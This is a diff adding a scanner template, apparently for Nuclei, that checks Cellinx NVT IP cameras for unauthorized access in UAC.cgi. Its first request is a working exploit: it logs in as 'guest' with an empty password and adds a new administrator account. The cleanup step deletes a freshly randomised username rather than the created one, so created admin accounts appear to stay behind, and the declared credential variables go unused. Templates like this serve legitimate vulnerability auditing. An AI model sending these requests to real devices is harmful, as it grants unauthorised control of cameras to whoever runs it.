@@ -1,0 +1,50 @@
+id: cellinx-nvt-uac-unauthorized-access
+
+info:
+  name: Cellinx NVT UAC.cgi Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The Cellinx NVT IP PTZ camera contains an unauthorized access vulnerability in UAC.cgi. This allows an attacker to obtain sensitive configuration information and add management users.
+  reference:
+    - https://www.ispyconnect.com/camera/cellinx
+  classification:
+    cvss-score: 7.5
+
+variables:
+  username: "testadm1n3"
+  password: "testtest"
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=UTF-8
+
+        {"jsonData":{"username":"guest","password":"","option":"add_user","data":{"username":"{{rand_base(6)}}","password":"{{rand_base(6)}}","permission":{"is_admin":"1","view":"1","ptz":"1","setting":"1","dout":"1"}}}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"add_user\":{\"result\" : \"Success\"}"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - raw:
+      - |
+        POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=UTF-8
+
+        {"jsonData":{"username":"guest","password":"","option":"delete_user","data":{"username":"{{rand_base(6)}}"}}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"delete_user\":{\"result\" : \"Success\"}"
+      - type: status
+        status:
+          - 200
